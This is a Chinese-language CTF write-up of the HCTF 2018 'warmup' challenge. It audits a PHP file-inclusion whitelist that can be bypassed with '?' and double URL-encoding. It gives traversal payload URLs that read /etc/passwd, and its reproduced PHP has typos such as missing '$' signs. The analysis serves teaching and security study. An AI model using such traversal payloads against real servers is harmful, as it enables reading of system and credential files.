#1.warming up 代码审计 

1.直接上代码 

 ```php
<?php

    class emmm

    {

        public static function checkFile(&$page)

        {

            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];

            if (! isset(page) || !is_string(page)) {

                echo "you can't see it";

                return false;

            }



            if (in_array(page, whitelist)) {

                return true;

            }



            $_page = mb_substr(

                $page,

                0,

                mb_strpos($page . '?', '?')

            );

            if (in_array(_page, whitelist)) {

                return true;

            }



            _page = urldecode(page);

            $_page = mb_substr(

                $_page,

                0,

                mb_strpos($_page . '?', '?')

            );

            if (in_array(_page, whitelist)) {

                return true;

            }

            echo "you can't see it";

            return false;

        }

    }



    if (! empty($_REQUEST['file'])

        && is_string($_REQUEST['file'])

        && emmm::checkFile($_REQUEST['file'])

    ) {

        include $_REQUEST['file'];

        exit;

    } else {

        echo "<br><img src="[https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg](https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg%5C)" />";

    }  

?>

 ```



从主程序开始读起 

```php
if (! empty($_REQUEST['file'])

        && is_string($_REQUEST['file'])

        && emmm::checkFile($_REQUEST['file'])

```



​    需要满足三个条件 (1)file参数不为空 (2)file参数是字符 (3)调用emm类下的checkfile函数

前面两个很好满足 直接跟进checkfile 

```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];

            if (! isset(page) || !is_string(page)) {

                echo "you can't see it";

                return false;

            }

```



设置了白名单 然后判断$page($_REQUEST[‘file’]) 是否在白名单里面 这个代码判断白名单是经常用的所以没问题 

```php
            $_page = mb_substr(

                $page,

                0,

                mb_strpos($page . '?', '?')

            );

            if (in_array(_page, whitelist)) {

                return true;

            }

```



这里又对$page进行了二次处理 

了解下mb_substr和mb_strpos函数原理: 

> string mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) 

> int mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] ) 

所以说这个代码就是考虑`hint.php?123`这个情况 ,`->mb_substr->hint.php` 也就是0-?(出现的位置) 

`hint.php?123`肯定是属于`hint.php` 所以说这种判断白名单很合理 

`inlcude hint.php?123 == include hint.php `

***/***********上面是我想当然的想法 参考了下网上的审计文章 ************/  **

真正去实践的时候发现 

`include ‘source.php?1’` 是包含失败的  



也就是说下面和上面那个都是漏洞点 而不是说仅仅是下面那个造成的。 

```
  $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
```

所以这个题目payload: 

<http://warmup.2018.hctf.io/index.php?file=hint.php?/../../../../../../etc/passwd>

[http://warmup.2018.hctf.io/index.php?file=hint.php%253F/../../../../../../etc/passwd](http://warmup.2018.hctf.io/index.php?file=hint.php?/../../../../../../etc/passwd)

都是可以的  



# End

网上的文章讲的让人看起来奇怪,漏洞成因都没分析透彻，如果有错误请师傅斧正。 

